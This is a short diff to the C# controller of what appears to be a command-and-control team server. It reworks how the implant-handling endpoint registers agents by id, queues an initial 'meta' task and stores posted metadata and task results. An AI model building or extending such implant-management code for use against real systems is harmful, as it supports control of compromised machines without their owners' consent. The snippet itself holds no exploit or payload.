@@ -64,17 +64,18 @@ namespace TeamServer.Models
         }
 
 
-        public async Task<IActionResult> HandleImplant()
+        public async Task<IActionResult> HandleImplant(string id)
         {
 
-            var metadata = ExtractMetadata(HttpContext.Request.Headers);
-            if (metadata == null)
-                return Content("<html>Hello</html>");
+            //var metadata = ExtractMetadata(HttpContext.Request.Headers);
+            //if (metadata == null)
+            //    return Content("<html>Hello</html>");
 
-            var agent = this._agentService.GetAgent(metadata.Id);
+            var agent = this._agentService.GetAgent(id);
             if (agent == null)
             {
-                agent = new Agent(metadata);
+                agent = new Agent(id);
+                agent.QueueTask(new AgentTask() { Command = "meta", Id = Guid.NewGuid().ToString() });
                 this._agentService.AddAgent(agent);
             }
 
@@ -97,12 +98,15 @@ namespace TeamServer.Models
                 using (var sr = new StreamReader(HttpContext.Request.Body))
                     json = await sr.ReadToEndAsync();
 
-                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
+                var result = JsonConvert.DeserializeObject<ResultData>(json);
 
-                agent.AddTaskResults(results);
+                if (result.Metadata != null)
+                    agent.Metadata = result.Metadata;
 
-                //Logger.Log($"Saving resulst of {agent.Metadata.Id}");
-                _fileService.SaveResults(agent, results);
+                agent.AddTaskResults(result.Results);
+
+                ////Logger.Log($"Saving resulst of {agent.Metadata.Id}");
+                _fileService.SaveResults(agent, result.Results);
             }
 
 
